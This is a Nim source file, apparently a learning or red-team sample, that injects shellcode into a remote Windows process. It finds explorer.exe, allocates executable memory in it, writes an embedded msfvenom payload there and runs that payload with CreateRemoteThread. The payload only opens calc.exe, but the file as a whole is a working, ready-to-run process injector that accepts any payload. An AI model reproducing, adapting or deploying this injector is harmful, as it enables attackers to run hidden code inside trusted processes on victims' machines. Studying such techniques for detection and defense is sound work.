# Description: Basic injector that executes shellcode in remote process
# Author: Jakob Friedl
# Created On: 2023-11-11

import 
    winim, 
    strformat, strutils

# Status Codes 
template info(s: varargs[untyped]): untyped =
    echo "[*] ", s
template okay(s: varargs[untyped]): untyped = 
    echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
    echo "[-] ", s
template value(s: varargs[untyped]): untyped = 
    echo " ┗ [ ", s

proc getPID(process: string): DWORD = 
    var snapshot: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    var p: PROCESSENTRY32 
    p.dwSize = cast[DWORD](sizeof(p))

    if Process32First(snapshot, addr p): 
        while Process32Next(snapshot, addr p):
            var processName: string = ""
            for c in p.szExeFile:
                if c == 0:
                    break
                processName.add(char((int)c))

            if processName.toLowerAscii == process.toLowerAscii:
                CloseHandle(snapshot)
                return p.th32ProcessID
    else: 
        fail "Could not get snapshot of processes"
        CloseHandle(snapshot)
        return ERROR

proc inject[I, T](process: string, shellcode: var array[I, T]): int = 
    
    # Getting PID 
    info fmt"Getting PID for {process}"
    var pid = getPID(process)
    if pid == ERROR: 
        fail fmt"Could not get PID for {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Got PID {pid} for {process}"

    # Getting handle to process
    info fmt"Getting handle to {process}"
    var hProcess: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
    if hProcess == 0: 
        fail fmt"Could not get handle to {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Got handle to {process}"
        value fmt"hProcess: {repr(hProcess)}"

    # Allocating memory in remote process
    info fmt"Allocating memory in {process}"
    var lpAddress: LPVOID = VirtualAllocEx(hProcess, nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if lpAddress == nil: 
        fail fmt"Could not allocate memory in {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Allocated memory in {process}"
        value fmt"lpAddress: {repr(lpAddress)}"

    # Writing shellcode to allocated memory in process
    info fmt"Writing shellcode to lpAddress"
    var bytesWritten: SIZE_T = 0
    if WriteProcessMemory(hProcess, lpAddress, shellcode.addr, shellcode.len, addr bytesWritten) == 0:
        fail fmt"Could not write shellcode to process {process} [error code: {GetLastError()}]"
        return ERROR
    okay fmt"Wrote {bytesWritten} bytes to {repr(lpAddress)}"

    # Creating remote thread to execute shellcode
    info fmt"Creating remote thread"
    var tid: DWORD = 0
    var hThread: HANDLE = CreateRemoteThread(hProcess, nil, 0, cast[LPTHREAD_START_ROUTINE](lpAddress), nil, 0, addr tid)
    if hThread == 0: 
        fail fmt"Could not start remote thread [error code: {GetLastError()}]"
        return Error

    okay fmt"Created remote thread."
    value fmt"hThread: {repr(hThread)}"
    value fmt"TID: {tid}"

    # Waiting for thread to finish
    info fmt"Waiting for thread to finish"
    if WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED: 
        fail fmt"Could not wait for thread to finish [error code: {GetLastError()}]"
        return ERROR
    okay fmt"Thread finished"

    # Cleaning up
    info fmt"Cleaning up"
    CloseHandle(hThread)
    CloseHandle(hProcess)


when defined(windows): 

    # msfvenom -p windows/x64/exec cmd=calc.exe EXITFUNC=thread --platform windows --arch x64 -f nim 
    var shellcode: array[276, byte] = [
    byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
    0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
    0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
    0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
    0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
    0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
    0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
    0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
    0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
    0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
    0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
    0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
    0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
    0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
    0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
    0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
    0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
    0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
    0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,
    0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
    0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
    0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
    0x00]

    when isMainModule: 
        discard inject("explorer.exe", shellcode)
